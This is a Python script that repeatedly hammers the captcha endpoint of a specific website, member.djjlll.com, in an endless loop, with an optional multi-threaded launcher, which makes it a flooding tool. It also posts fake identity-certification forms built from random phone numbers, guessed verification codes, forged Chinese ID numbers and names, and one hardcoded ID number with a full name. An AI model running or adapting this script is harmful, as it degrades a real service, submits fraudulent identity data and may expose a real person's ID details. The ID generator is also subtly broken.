#!/usr/bin/python
# coding=utf-8
import random
import sys
import threading
import time

import requests


def check_api():
    url = 'http://member.djjlll.com/index.php/user/certification'
    data_json = dict()
    data_json['username'] = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba1234567890', 8))
    # data_json['idcard'] = get_id_card()
    data_json['idcard'] = 360782199502110054
    # data_json['idname'] = get_name()
    data_json['idname'] = '陈俊学'
    data_json['phone'] = get_phone()
    data_json['verify'] = ''.join(random.sample('1234567890', 4))
    data_json['phoneCode'] = ''.join(random.sample('1234567890', 4))
    data_json['memberType'] = 1
    a = requests.post(url=url, json=data_json).json()
    print(a, data_json, sep='=>')


def get_code():
    url = 'http://member.djjlll.com/index.php/public/verify?0.8925178618682823'
    a = requests.get(url=url).text
    if len(a):
        print('获取验证码成功')
    else:
        print('获取验证码失败')


def get_phone():
    str_start = random.choice(['135', '136', '138'])
    str_end = ''.join(random.sample('0123456789', 8))
    str_phone = str_start + str_end
    return (str_phone)


def regiun():
    '''生成身份证前六位'''
    # 列表里面的都是一些地区的前六位号码
    first_list = ['362402', '362421', '362422', '362423', '362424', '362425', '362426', '362427', '362428', '362429',
                  '362430', '362432', '110100', '110101', '110102', '110103', '110104', '110105', '110106', '110107',
                  '110108', '110109', '110111']
    first = random.choice(first_list)
    return first


def year():
    '''生成年份'''
    now = time.strftime('%Y')
    # 1948为第一代身份证执行年份,now-18直接过滤掉小于18岁出生的年份
    second = random.randint(1948, int(now) - 18)
    age = int(now) - second
    print('随机生成的身份证人员年龄为：' + str(age))
    return second


def month():
    '''生成月份'''
    three = random.randint(1, 12)
    # 月份小于10以下，前面加上0填充
    if three < 10:
        three = '0' + str(three)
        return three
    else:
        return three


def day():
    '''生成日期'''
    four = random.randint(1, 31)
    # 日期小于10以下，前面加上0填充
    if four < 10:
        four = '0' + str(four)
        return four
    else:
        return four


def randoms():
    '''生成身份证后四位'''
    # 后面序号低于相应位数，前面加上0填充
    five = random.randint(1, 9999)
    if five < 10:
        five = '000' + str(five)
        return five
    elif 10 < five < 100:
        five = '00' + str(five)
        return five
    elif 100 < five < 1000:
        five = '0' + str(five)
        return five
    else:
        return five


def get_id_card():
    first = regiun()
    second = year()
    three = month()
    four = day()
    last = randoms()
    IDcard = str(first) + str(second) + str(three) + str(four) + str(last)
    return IDcard


def get_name():
    xing = '赵钱孙李周吴郑王冯陈褚卫蒋沈韩杨朱秦尤许何吕施张孔曹严华金魏陶姜'
    ming = '豫章故郡洪都新府星分翼轸地接衡庐襟三江而带五湖'
    X = random.choice(xing)
    M = "".join(random.choice(ming) for i in range(2))
    return X + M


def xfor():
    while True:
        get_code()


def start(num: int):
    for key in range(num):
        threading.Thread(target=xfor).start()
    while True:
        time.sleep(1)


if __name__ == '__main__':
    # a = sys.argv[1]
    # print(type(a), a)
    # start(a)
    xfor()
